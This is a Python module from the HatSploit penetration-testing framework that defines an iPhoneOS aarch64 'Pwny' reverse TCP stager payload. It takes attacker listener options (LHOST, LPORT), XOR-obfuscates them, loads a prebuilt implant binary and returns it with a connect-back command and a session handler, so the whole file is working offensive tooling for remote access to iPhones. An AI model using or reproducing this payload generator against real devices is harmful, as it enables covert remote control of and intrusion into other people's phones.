#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.payload import Payload
from hatsploit.utils.string import StringTools
from hatsploit.utils.tcp import TCPClient

from data.pwny.iphoneos.session import HatSploitSession


class HatSploitPayload(Payload, StringTools, TCPClient):
    details = {
        'Category': "stager",
        'Name': "iPhoneOS aarch64 Pwny Reverse TCP",
        'Payload': "iphoneos/aarch64/pwny_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Pwny reverse TCP payload for iPhoneOS aarch64.",
        'Comments': [
            ''
        ],
        'Architecture': "aarch64",
        'Platform': "iphoneos",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        local_host, local_port = self.parse_options(self.options)

        local_host = self.xor_string(local_host)
        local_port = self.xor_string(local_port)

        self.output_process("Generating payload...")
        with open('data/pwny/iphoneos/aarch64/pwny', 'rb') as f:
            payload = f.read()

        return payload, f"reverse '{local_host}' '{local_port}'", HatSploitSession
